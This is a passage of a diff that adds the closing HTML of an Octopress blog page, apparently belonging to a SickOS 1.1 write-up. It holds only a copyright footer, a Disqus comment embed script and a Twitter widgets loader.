+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/';
+        var disqus_url = 'http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
